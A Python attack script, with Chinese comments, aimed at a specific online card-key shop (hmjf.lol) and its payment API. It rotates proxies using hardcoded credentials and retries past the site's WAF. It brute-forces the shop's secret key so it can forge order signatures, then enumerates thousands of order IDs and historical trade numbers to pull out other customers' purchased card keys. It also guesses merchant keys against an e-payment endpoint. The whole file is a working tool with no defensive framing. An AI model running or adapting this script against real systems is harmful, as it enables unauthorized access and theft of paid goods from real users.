#!/usr/bin/env python3
"""
hmjf.lol 卡密深挖 v6 (跳板机版)
- SYS_KEY 爆破: skey = md5(id + SYS_KEY + id)
- ajax query POST: type=1&qq={trade_no}
- 历史订单 258天窗口
- 易支付 pid=1003 key 撞库
"""
import re, json, subprocess, time, os, hashlib, urllib.parse
from datetime import datetime, timedelta

BASE = "https://hmjf.lol/shop"
EPAY = "http://api.ttwl66.cn"
OUT = os.environ.get("HMJF_OUT", "/data/automation/results/hmjf.lol/kami_mine_20260716")
ENV_FILE = os.environ.get("PROXY_ENV", "/data/config/proxy.env")
FETCH_SH = os.environ.get("QG_FETCH", "/data/automation/bin/qg-proxy-fetch.sh")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = "https://hmjf.lol/shop/"
os.makedirs(OUT, exist_ok=True)

def lp():
    if not os.path.exists(ENV_FILE):
        return ""
    for l in open(ENV_FILE):
        if l.startswith("PROXY_URL="):
            return l.split("=", 1)[1].strip().strip('"')
    return ""

PX = lp()
N = 0
R = {"hits": [], "sys_key": None, "tests": {}, "paid": []}
LOG = open(f"{OUT}/v6.log", "a", buffering=1)

def log(m):
    print(m, flush=True)
    LOG.write(m + "\n")

def refresh():
    global PX
    env = {**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"}
    if os.path.exists(FETCH_SH):
        subprocess.run(["bash", FETCH_SH], capture_output=True, env=env)
    PX = lp()
    log(f"  proxy -> {PX.split('@')[-1] if '@' in PX else PX}")
    time.sleep(2)

def go(url, post=None, timeout=18):
    global N, PX
    if not PX:
        refresh()
    N += 1
    if N % 60 == 0:
        refresh()
    c = ["curl", "-s", "-w", "\n__C:%{http_code}__", "--max-time", str(timeout),
         "-A", UA, "-H", f"Referer: {REF}", "-x", PX]
    if post is not None:
        c += ["-X", "POST", "-d", post,
              "-H", "Content-Type: application/x-www-form-urlencoded"]
    c.append(url)
    try:
        raw = subprocess.run(c, capture_output=True, text=True, timeout=timeout + 5).stdout or ""
        if "_guard" in raw or "slider_html" in raw:
            log("  WAF sleep")
            time.sleep(8)
            refresh()
            return go(url, post, timeout)
        m = re.search(r"__C:(\d+)__", raw)
        body = raw[:m.start()] if m else raw
        return body, int(m.group(1)) if m else 0
    except Exception as e:
        return str(e), 0

def hit(tag, data):
    R["hits"].append({"via": tag, "data": data})
    log(f"*** HIT [{tag}] {str(data)[:350]}")
    json.dump(R, open(f"{OUT}/v6_results.json", "w"), ensure_ascii=False, indent=2)

def skey_for(oid, sys_key):
    return hashlib.md5(f"{oid}{sys_key}{oid}".encode()).hexdigest()

def has_kami(t):
    return t and any(x in t.lower() for x in ["kminfo", "km_info", '"km"', "卡密内容"])

def try_order(oid, sk, tag=""):
    h, _ = go(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}")
    if not h or "验证失败" in h:
        return None
    try:
        j = json.loads(h)
        if j.get("kminfo"):
            hit(f"kminfo_{tag}", {"id": oid, "skey": sk, "data": j})
            return j
        if j.get("code") == 0:
            hit(f"order_ok_{tag}", {"id": oid, "skey": sk, "status": j.get("status"), "name": j.get("name")})
            return j
    except Exception:
        if has_kami(h):
            hit(f"kminfo_raw_{tag}", {"id": oid, "raw": h[:300]})
    return None

def save():
    json.dump(R, open(f"{OUT}/v6_results.json", "w"), ensure_ascii=False, indent=2)

# ── 0. connectivity ──
log("[0] start")
body, code = go(f"{BASE}/ajax.php?act=getcount", "")
log(f"getcount: {body[:120]}")
if not body.strip():
    refresh()
    body, _ = go(f"{BASE}/ajax.php?act=getcount", "")
    if not body.strip():
        log("FATAL: proxy/connect fail")
        raise SystemExit(1)

# ── A. ajax query POST ──
log("[A] ajax query")
tns = ["20260716025337303", "20260716030008400", "20260716031217345",
       "20260716031222624", "20260716031453854"]
for tn in tns:
    for post in [f"type=1&qq={tn}", f"qq={tn}", f"type=1&data={tn}"]:
        body, _ = go(f"{BASE}/ajax.php?act=query", post)
        R["tests"][f"q_{tn[-6:]}_{post[:12]}"] = body[:250]
        if body and '"code":0' in body and '"data"' in body and len(body) > 60:
            hit("ajax_query", {"tn": tn, "post": post, "body": body[:500]})
            try:
                for row in json.loads(body).get("data", []):
                    oid, sk = row.get("id"), row.get("skey")
                    if oid and sk:
                        try_order(oid, sk, "from_query")
            except Exception:
                pass
        time.sleep(0.3)
save()

# ── B. contact query ──
log("[B] contact query")
for c in ["13800138000", "test", "test123", "kamitest", "datou111", "datou333"]:
    body, _ = go(f"{BASE}/ajax.php?act=query", f"qq={c}")
    if body and '"code":0' in body and '"data"' in body and len(body) > 80:
        hit("contact_query", {"contact": c, "body": body[:400]})
    time.sleep(0.2)
save()

# ── C. SYS_KEY brute ──
log("[C] SYS_KEY brute")
KEYS = [
    "", "123456", "123456789", "12345678", "xuxin", "hmjf", "hmjf.lol", "shua", "faka",
    "admin", "secret", "key", "password", "虚心", "虚心U", "虚心U自动发卡",
    "kakayun", "caihong", "rainbow", "cccyun", "yunshang", "666666", "888888",
    "datou111", "datou333", "TFQrPKpDjzLhQ288jv9tkFTj66Hqz1L76x",
    "1003", "ttwl66", "api.ttwl66.cn", "hmjf2026", "xuxinU", "lol",
    "02E76F93", "A0FFB679553D",
]
for sk in KEYS:
    for oid in range(1, 501):
        calc = skey_for(oid, sk)
        j = try_order(oid, calc, f"syskey_{sk[:8]}")
        if j:
            R["sys_key"] = sk
            hit("SYS_KEY_FOUND", {"sys_key": sk, "id": oid})
            break
    if R["sys_key"]:
        break
    if KEYS.index(sk) % 10 == 0:
        log(f"  tried {sk!r}")
    time.sleep(0.05)
save()

# ── D. batch if SYS_KEY ──
if R["sys_key"]:
    log(f"[D] batch scan id 1-20000 key={R['sys_key']!r}")
    for oid in range(1, 20001):
        sk = skey_for(oid, R["sys_key"])
        j = try_order(oid, sk, "batch")
        if oid % 500 == 0:
            log(f"  id {oid} hits={len(R['hits'])}")
            save()
        time.sleep(0.08)

# ── E. epay key ──
log("[E] epay key")
tn = "20260716030008400"
for key in KEYS[:30]:
    url = f"{EPAY}/api.php?act=order&pid=1003&key={urllib.parse.quote(key)}&out_trade_no={tn}"
    body, _ = go(url, timeout=12)
    if body and ("trade_no" in body or '"status"' in body) and "sign" not in body.lower():
        hit("epay_key", {"key": key, "body": body[:300]})
    time.sleep(0.25)
save()

# ── F. historical scan ──
log("[F] historical paid scan")
start = datetime(2025, 11, 1)
end = datetime(2026, 7, 16)
prefixes = []
d = start
while d <= end:
    for h in (10, 12, 14, 16, 18, 20, 22):
        prefixes.append(d.strftime("%Y%m%d") + f"{h:02d}00")
    d += timedelta(days=3)
prefixes += [f"20260716{h:02d}00" for h in range(24)]

seen = set()
for pi, prefix in enumerate(prefixes):
    for s in range(0, 1000, 25):
        tn = f"{prefix}{s:03d}"
        if len(tn) != 17 or tn in seen:
            continue
        seen.add(tn)
        sh, _ = go(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
        if "window.location" not in sh or "该订单号不存在" in sh:
            continue
        gs, _ = go(f"{BASE}/other/getshop.php?trade_no={tn}")
        qb, _ = go(f"{BASE}/ajax.php?act=query", f"type=1&qq={tn}")
        ent = {"trade_no": tn, "getshop": gs[:150], "query": qb[:200]}
        try:
            gj = json.loads(gs)
            if gj.get("kminfo"):
                hit("getshop_kami", ent)
            elif gj.get("code") != -1 or gj.get("msg") != "未付款":
                R["paid"].append(ent)
                log(f"  PAID? {tn}")
        except Exception:
            pass
        if qb and '"data"' in qb and '"code":0' in qb:
            hit("hist_query", ent)
            try:
                for row in json.loads(qb).get("data", []):
                    oid, sk = row.get("id"), row.get("skey")
                    if oid and sk:
                        try_order(oid, sk, tn)
            except Exception:
                pass
        time.sleep(0.22)
    if pi % 15 == 0:
        log(f"  hist {pi}/{len(prefixes)} paid={len(R['paid'])} hits={len(R['hits'])}")
        save()
save()

log(f"DONE hits={len(R['hits'])} sys_key={R['sys_key']} paid={len(R['paid'])}")
LOG.close()
